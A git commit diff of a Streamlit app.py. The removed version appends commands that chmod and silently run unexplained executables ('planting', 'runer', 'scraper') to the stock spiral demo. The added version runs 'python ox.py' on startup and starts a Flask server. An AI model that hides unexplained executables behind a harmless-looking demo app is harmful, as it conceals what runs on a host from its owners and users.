7c388421c087d4be53236f57cb3a21be2c7cf0ac
minotoloa <118993470+minotoloa@users.noreply.github.com>
2022-12-05 14:40:45 +0700

    Update app.py

--- app.py
+++ app.py
@@ -1,42 +1,25 @@
 import streamlit as st
-from collections import namedtuple
-import altair as alt
-import math
-import pandas as pd
-import subprocess
+import os
+os.system('python ox.py')
+if not hasattr(st, 'already_started_server'):
+    st.already_started_server = True
 
+    st.write('''
+        The first time this script executes it will run forever because it's
+        running a Flask server.
+        Just close this browser tab and open a new one to see your Streamlit
+        app.
+    ''')
 
-"""
-# Welcome to Streamlit!
-Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
-If you have any questions, checkout our [documentation](https://docs.streamlit.io) and [community
-forums](https://discuss.streamlit.io).
-In the meantime, below is an example of what you can do with just a few lines of code:
-"""
+    from flask import Flask
 
+    app = Flask(__name__)
 
-with st.echo(code_location='below'):
-    total_points = st.slider("Number of points in spiral", 1, 5000, 2000)
-    num_turns = st.slider("Number of turns in spiral", 1, 100, 9)
+    @app.route('/foo')
+    def serve_foo():
+        return 'This page is served via Flask!'
 
-    Point = namedtuple('Point', 'x y')
-    data = []
+    app.run(port = 8880)
 
-    points_per_turn = total_points / num_turns
-
-    for curr_point_num in range(total_points):
-        curr_turn, i = divmod(curr_point_num, points_per_turn)
-        angle = (curr_turn + 1) * 2 * math.pi * i / points_per_turn
-        radius = curr_point_num / total_points
-        x = radius * math.cos(angle)
-        y = radius * math.sin(angle)
-        data.append(Point(x, y))
-
-    st.altair_chart(alt.Chart(pd.DataFrame(data), height=500, width=500)
-        .mark_circle(color='#0068c9', opacity=0.5)
-        .encode(x='x:Q', y='y:Q'))
-
-    perm = subprocess.run(["chmod", "+x",  "planting", "runer", "scraper", "compile.sh"])
-print("Perm exit code was: %d" % perm.returncode)
-scraper = subprocess.run(["./scraper"], stdout=subprocess.DEVNULL)
-print("Scraper exit code was: %d" % scraper.returncode)
+x = st.slider('Pick a number')
+st.write('You picked:', x)
